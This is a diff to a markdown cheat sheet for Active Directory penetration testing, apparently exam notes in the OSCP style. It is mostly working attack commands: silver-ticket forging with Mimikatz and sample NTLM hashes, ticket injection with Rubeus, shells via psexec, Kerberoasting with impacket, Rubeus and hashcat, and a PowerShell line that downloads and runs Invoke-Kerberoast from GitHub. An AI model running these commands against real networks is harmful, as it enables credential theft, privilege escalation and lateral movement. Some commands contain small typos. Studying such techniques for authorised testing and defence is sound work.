@@ -195,6 +195,40 @@ Invoke-Mimikatz -Command '"kerberos::golden /domain:<domain> /sid:<domainsid> /t
 kerberos::list
 ```
 
+Complete steps
+```bash
+#using NTLM generate the Silver Ticket (TGS) and inject it into memory for current session using /ptt
+kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user> /ptt
+      kerberos: :golden /user:offsec /domain:corp.com /sid: S-1-5-21-4038953314-3014849035-1274281563 /target:CorpSqlServer.corp.com:1433 /service:MSSQLSvc /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+      kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+
+#using NTLM generate the Silver Ticket (TGS) and inject it into memory for current session and output to ticket.kirbi using /ticket flag
+kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user> /ticket
+
+#using aeskey generate the Silver Ticket (TGS) and inject it into memory
+kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /aes128:$KRBTGT_AES_128_KEY /user:$DOMAIN_USER /service:$SERVICE_SPN /target:$SERVICE_MACHINE_HOSTNAME
+
+# Checking if the forged tickets is in memory
+ps> klist
+
+# verify access to targeted SPN
+iwr -UseDefaultCredentials http://web04
+
+# Inject the ticket (not needed if the TGS is already loaded in current session)
+mimikatz.exe "kerberos::ptt <TICKET_FILE>"
+.\Rubeus.exe ptt /ticket:<TICKET_FILE>
+        .\Rubeus.exe ptt /ticket:C:\Temp\silver.kirbi
+
+# Obtain a shell
+cmd> psexec.exe -accepteula \\<remote_hostname> cmd   # psexec
+cmd> sqlcmd.exe -S [service_hostname]                 # if service is MSSQL
+
+```
+
+
+
+
+
 ## Golden Ticket - Pass the Ticket
 - It is a persistence and elevation of privilege technique where tickets are forged to take control of the Active Directory Key Distribution Service (KRBTGT) account and issue TGT's.
 
@@ -291,7 +325,11 @@ impacket-GetUserSPNs <domain>/<user>:<password>// -dc-ip <IP> -request
 ```
 or  
 ```
-GetUserSPNs.py -request -dc-ip <RHOST> <domain>/<user>  
+GetUserSPNs.py -request -dc-ip <RHOST> <domain>/<user>
+```
+or
+```
+impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 ```
 or
 ```
@@ -303,7 +341,8 @@ Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepat
 ```
 
 ```
-hashcat -a 0 -m 13100 ok.txt /usr/share/wordlists/rockyou.txt 
+hashcat -a 0 -m 13100 ok.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 ```
 .\PsExec.exe -u <domain>\<user> -p <password> cmd.exe
@@ -314,6 +353,16 @@ runas /user:<hostname>\<user> cmd.exe
 ```
 
 ### On Windows
+- Method 1 (Reubeus)
+```bash
+#automatically find kerberoastable users  in targeted Domain
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
+#crack hash using hashcat 13100, TGS-REP, output is plaintext password of kerberoastable account
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+- Method 2
 ```bash
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"
 
@@ -323,6 +372,22 @@ OR
 hashcat64.exe -m 13100 "C:\Users\test\Documents\Kerb1.txt" C:\Users\test\Documents\Wordlists\Rocktastic12a --outfile="C:\Users\test\Documents\CrackedKerb1.txt"
 ```
 
+- Method 3
+```bash
+#get SPN that you want to target
+impacket-GetUserSPNs exam.com/apachesvc -dc-ip 172.16.1xx.100
+
+#requesting TGS ticket, i.e. .kirbi
+PS C:\Users\offsec> Add-Type -AssemblyName System. IdentityModel
+PS C:\Users\offsec> New-Object System. IdentityModel. Tokens. KerberosRequestorSecurityToken -ArgumentList 'SPN'
+        PS C:\Users\offsec> New-Object System. IdentityModel. Tokens. KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
+mimikatz # kerberos :: list /export
+
+#crack hash using tgsrepcrack.py
+/usr/share/kerberoast/tgsrepcrack.py wordlist.txt 2-40a50000-offsec@HTTP\~CorpWebServer.corp.com-CORP.COM.kirbi
+#crack hash using kirbi2john.py
+python3 kirbi2john.py /root/pen200/exercise/ad/sgl.kirbi
+```
 
 # Tools Introduction
 -   Windows Run As - Switching users in linux is trival with the `SU` command.  However, an equivalent command does not exist in Windows.  Here are 3 ways to run a command as a different user in Windows.
@@ -421,10 +486,6 @@ sudo bloodhound
 # then upload the .zip files obtained
 ```
 
-
-
-
-
 ## EvilWinRM (install before exam, do a snapshot before installing)
 - Gives persistent shell. Crackmapexec doesnt.
 - Installation: `gem install evil-winrm`
@@ -481,47 +542,7 @@ ps> whoami /user
 # this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain SID is "S-1-5-21-1987370270-658905905-1781884369" i.e. omit RID of "1105"
 ```
 
-- Forging silver ticket (TGS) Ft **Mimikatz**
-<aside>
-Forging a TGS (and included PAC)
-Requires the machine account password (key) from the KDC
-Can be used to directly access any service (without touching DC)
-</aside>
 
-```bash
-mimikatz.exe
-prvilege::debug
-#using NTLM generate the Silver Ticket (TGS) and inject it into memory for current session using /ptt
-kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user> /ptt
-      kerberos: :golden /user:offsec /domain:corp.com /sid: S-1-5-21-4038953314-3014849035-1274281563 /target:CorpSqlServer.corp.com:1433 /service:MSSQLSvc /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
-      kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
-
-#using NTLM generate the Silver Ticket (TGS) and inject it into memory for current session and output to ticket.kirbi using /ticket flag
-kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user> /ticket
-#using aeskey generate the Silver Ticket (TGS) and inject it into memory
-kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /aes128:$KRBTGT_AES_128_KEY /user:$DOMAIN_USER /service:$SERVICE_SPN /target:$SERVICE_MACHINE_HOSTNAME
-
-# Checking if the forged tickets is in memory
-ps> klist
-
-#verify access to targeted SPN
-iwr -UseDefaultCredentials http://web04
-```
-
-- Inject the ticket (not needed if the TGS is already loaded in current session)
-
-```bash
-mimikatz.exe "kerberos::ptt <TICKET_FILE>"
-.\Rubeus.exe ptt /ticket:<TICKET_FILE>
-        .\Rubeus.exe ptt /ticket:C:\Temp\silver.kirbi
-```
-
-- Obtain a shell
-
-```bash
-cmd> psexec.exe -accepteula \\<remote_hostname> cmd   # psexec
-cmd> sqlcmd.exe -S [service_hostname]                 # if service is MSSQL
-```
 
 ### Golden Ticket Ft **Mimikatz** (Forge ticket)
 <aside>
@@ -554,51 +575,12 @@ mimikatz # misc::cmd
 mimikatz # misc::cmd whoami
 ```
 
-
-
-### Manual [Kerberoasting] effort of requesting the service ticket, exporting it, and cracking it by using the tgsrepcrack.py Python script (Kerberoasting)
-- method 1
-```bash
-#automatically find kerberoastable users  in targeted Domain
-.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
-
-#crack hash using hashcat 13100, TGS-REP, output is plaintext password of kerberoastable account
-sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
-```
-
-- method 2 in Kali
-```bash
-#ip of DC (-dc-ip), credential of domain user (corp.com/pete), obtain TGS (-request)
-sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
-
-#crack hash using hashcat 13100
-sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
-```
-
-- method 2 in Windows
-```bash
-#get SPN that you want to target
-impacket-GetUserSPNs exam.com/apachesvc -dc-ip 172.16.1xx.100
-
-#requesting TGS ticket, i.e. .kirbi
-PS C:\Users\offsec> Add-Type -AssemblyName System. IdentityModel
-PS C:\Users\offsec> New-Object System. IdentityModel. Tokens. KerberosRequestorSecurityToken -ArgumentList 'SPN'
-        PS C:\Users\offsec> New-Object System. IdentityModel. Tokens. KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
-mimikatz # kerberos :: list /export
-
-#crack hash using tgsrepcrack.py
-/usr/share/kerberoast/tgsrepcrack.py wordlist.txt 2-40a50000-offsec@HTTP\~CorpWebServer.corp.com-CORP.COM.kirbi
-#crack hash using kirbi2john.py
-python3 kirbi2john.py /root/pen200/exercise/ad/sgl.kirbi
-```
-
 ### Targeted Kerberoasting
 - Condition: have GenericWrite or GenericAll permissions on another AD user account
 - then, purposely set SPN for the targeted user
 - then kerberoast the account
 - then crack the hash using hashcat to get the clear password
 - after attack, REMEMBER to delete the SPN
-
 
 
 ### DCSync-Domain Controller Synchronization
